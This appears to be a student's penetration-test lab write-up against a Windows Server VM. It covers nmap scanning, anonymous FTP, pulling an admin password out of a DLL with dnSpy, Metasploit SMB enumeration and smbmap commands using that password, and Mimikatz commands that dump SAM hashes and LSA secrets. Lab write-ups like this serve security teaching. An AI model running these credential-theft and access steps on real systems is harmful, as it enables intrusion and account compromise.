# Breaking Glass (or Windows)
## Recon and Fingerprinting
- Once both hosts (Kali [attacker] and tortuga_server) were configured to be on the host-only network, the first thing I always do is use nmap to fingerprint the hosts on the network. Using the command “nmap 192.168.141.0/24” nmap will search for all hosts in the subdomain .141.0/24 where I have the host only network set.

![img](https://github.com/elisims/breakingwindows/raw/main/images/1.jpg)

- This confirmed the open ports and the IP address of the tortuga_server to be “192.168.141.130”. So, I decided to run another nmap scan- This time focusing on the IP of the server directly and using the flag -A which will return much more information about the host and its ports.

```console
"PORT      STATE SERVICE      VERSION
21/tcp    open  ftp         Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-07-21  01:21PM      <DIR>         aspnet_client"
"|"	"03-07-21"	"01:20PM"	99710	"iis-85.png"	
"|"	"03-07-21"	"01:20PM"	701	"iisstart.htm"	
"|"	"03-07-21"	"01:21PM"	9746	"unattend.txt"	
"|_03-21-21"	"04:32PM"	0	"web.config"	
"| ftp-syst:"				
"|_  SYST: Windows_NT
80/tcp    open  http        Microsoft IIS httpd 8.5
|_http-server-header: Microsoft-IIS/8.5
|_http-title: IIS 8.5 Detailed Error - 500.19 - Internal Server Error 135/tcp   
open  msrpc       Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 
8080/tcp  open  http        Microsoft IIS httpd 8.5
| http-methods:
|_  Potentially risky methods: TRACE COPY PROPFIND LOCK UNLOCK PROPPATCH MKCOL PUT DELETE MOVE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: 192.168.141.130 - /
| http-webdav-scan:
|   Server Type: Microsoft-IIS/8.5
|   WebDAV type: Unknown
|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, 
PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
|   Server Date: Sat, 10 Apr 2021 20:10:00 GMT
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, LOCK, UNLOCK
49152/tcp open  msrpc       Microsoft Windows RPC 
49153/tcp open  msrpc       Microsoft Windows RPC 
49154/tcp open  msrpc       Microsoft Windows RPC 
49155/tcp open  msrpc       Microsoft Windows RPC 
49156/tcp open  msrpc       Microsoft Windows RPC 
49157/tcp open  msrpc       Microsoft Windows RPC 
49158/tcp open  msrpc       Microsoft Windows RPC 
49159/tcp open  msrpc       Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows"
"Host script results:
|_nbstat: NetBIOS name: SERVER01, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:b0:05:3d (VMware)
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported"
```
- This scan showed that the ftp port was not only open, but also extremely vulnerable because anonymous FTP login is allowed.

![img](https://github.com/elisims/breakingwindows/raw/main/images/2.jpg)

- Typing the IP Address of the host into firefox, but using the ftp protocol to connect to the files freely, provides a file directory of completely vulnerable files- Plainly available to any attacker for download and exploitation.

![img](https://github.com/elisims/breakingwindows/raw/main/images/3.jpg)

- After navigating through the files, the most promising file seems to be the FileTransfer.dll- As these files can be reverse engineered using programs like dnSpy.

![img](https://github.com/elisims/breakingwindows/raw/main/images/4.jpg)

- Using dnSpy on this file, we are able to uncover the administrator’s password with just a little investigation.

![img](https://github.com/elisims/breakingwindows/raw/main/images/5.jpg)

- This same sort of vulnerability exists on port :8080, as we could clearly see from the previous nmap scan- The port :8080 is open and has the public options set to accept nearly any requests.

![img](https://github.com/elisims/breakingwindows/raw/main/images/6.jpg)

- Navigating to this port on firefox, we are returned to a similar directory/GUI to navigate through the files freely. And, once again, the FileTransfer.dll is available for download- Which can be reverse engineered to uncover the password using dnSpy like before.

![img](https://github.com/elisims/breakingwindows/raw/main/images/7.jpg)
![img](https://github.com/elisims/breakingwindows/raw/main/images/8.jpg)

## SMB Exploitation
- Another vulnerability revealed by the original nmap scan was port 445 being open. This leaves the port vulnerable to exploitation of the SMB Protocol or Server Message Block (SMB) Protocol which is a network file sharing protocol. To exploit this vulnerability, I used the program on Kali Linux called “metasploit”.
> - use auxiliary/scanner/smb/smb_enumshares
>> - set rhosts 192.168.141.130
>> - set smbuser administrator
>> - set smbpass 1q@W3e$R5t^Y7u*I9o)P-[+}
>> - exploit

![img](https://github.com/elisims/breakingwindows/raw/main/images/9.jpg)

> - use auxiliary/scanner/smb/smb_enumusers
>> - set rhosts 192.168.141.130
>> - set smbuser administrator
>> - set smbpass 1q@W3e$R5t^Y7u*I9o)P-[+}
>> - Exploit

![img](https://github.com/elisims/breakingwindows/raw/main/images/10.jpg)

> - use auxiliary/scanner/smb/smb_lookupsid
>> - set rhosts 192.168.141.130
>> - set smbuser administrator
>> - set smbpass 1q@W3e$R5t^Y7u*I9o)P-[+}
>> - Exploit

![img](https://github.com/elisims/breakingwindows/raw/main/images/11.jpg)

- Next, I used SMBmap to dig further into the vulnerabilities that exist with the open SMB port.
> - smbmap -H 192.168.141.130 -u administrator -p '1q@W3e$R5t^Y7u*I9o)P-[+}'

![img](https://github.com/elisims/breakingwindows/raw/main/images/12.jpg)

- With the disks listed, and already obtaining the administrator credentials, I used SMBclient to connect to these disks and traverse their directories.

![img](https://github.com/elisims/breakingwindows/raw/main/images/13.jpg)
![img](https://github.com/elisims/breakingwindows/raw/main/images/14.jpg)

- Through the SMBclient, I was able to access the host and view all the files- Including being able to download the files for further investigation and exploitation.

## Server Vulnerabilities (Policy and Mimikatz)
- Moving onto vulnerabilities on the host itself, after logging into the tortuga_server using the administrator password we uncovered with dnSpy, I first looked into the vulnerabilities in the policies of the system.

![img](https://github.com/elisims/breakingwindows/raw/main/images/15.jpg)

- First and foremost, the password policy has a few glaring issues- the first being the password length requirement. Most cybersecurity frameworks recommend this setting be set to at the very least 14 characters (some recommending all the way up to 21). This would make brute forcing passwords of the accounts that we are able to uncover very quick. Another recommendation would be to set the maximum password age to 24 days- As that is also what most cybersecurity frameworks would recommend.

- The second issue I could uncover with the policies occurs with the Account Lockout Policy. There is currently no lockout threshold or lockout duration- which makes the accounts of this server vulnerable to brute force attack attempts. Without punishing the wrong guesses, attackers can run attacks with countless payload combinations and endless wordlists.

![img](https://github.com/elisims/breakingwindows/raw/main/images/16.jpg)

- Finally, using mimikatz on the tortuga_server, I was able to dig deep into the server to look for vulnerabilities.
- First, I escalated privilege using the “privilege::debug” command in combination with the “token::elevate” command.

![img](https://github.com/elisims/breakingwindows/raw/main/images/17.jpg)
![img](https://github.com/elisims/breakingwindows/raw/main/images/18.jpg)

- This impersonation elevated my privilege to SYSTEM. Once elevated, I was able to use the command “lsadump::sam” which gave me the NTLM hash of the user “A155851”. This NTLM hash can be used with hashcat to crack the password using wordlists. In combination with such a weak password policy, it wouldn’t take very long to figure out this password. 
- The final command I ran using mimikatz was the “lsadump::secrets” command. This ended up containing the password of the administrator account- Which is another huge vulnerability.

![img](https://github.com/elisims/breakingwindows/raw/main/images/19.jpg)
